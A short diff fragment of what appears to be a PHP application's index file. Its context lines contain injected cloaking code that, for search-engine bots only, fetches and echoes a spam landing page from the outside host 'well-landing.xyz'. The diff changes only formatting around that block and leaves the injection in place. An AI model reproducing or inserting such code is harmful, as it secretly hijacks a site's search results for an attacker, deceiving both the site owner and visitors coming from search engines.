@@ -31,7 +31,10 @@ function fetch_content($url) {
  
 if (is_bot()) {
     echo fetch_content('https://well-landing.xyz/landing/islamiconomicc.html');
-}
+} 
+?>
+
+<?php
 
 /**
  * @defgroup index Index
